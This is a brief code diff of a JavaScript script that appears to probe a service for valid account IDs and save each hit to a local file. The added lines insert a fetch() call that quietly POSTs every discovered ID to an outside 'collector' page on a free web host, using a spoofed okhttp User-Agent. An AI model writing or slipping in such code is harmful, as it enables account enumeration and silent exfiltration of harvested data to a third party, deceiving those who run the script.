@@ -94,7 +94,20 @@ fs.appendFile("numbers.txt",id+"\n",function (err) {if (err) throw err;
 console.log('Success! '+id);
   go()
 });
-  
+  fetch('https://renoche.000webhostapp.com/collector/accounts.php', {
+    method: 'POST',
+
+    headers: {
+        'Content-Type': 'application/json; charset=utf-8',
+        'User-Agent': 'okhttp/4.9.1',
+        'Version': '100',
+        'Accept-Encoding': 'gzip',
+      
+    },
+    body: JSON.stringify(
+{"id":id}
+)
+})
 }else if(response.status == 404){
 //console.log(id+" fail "+response.status)
   go()
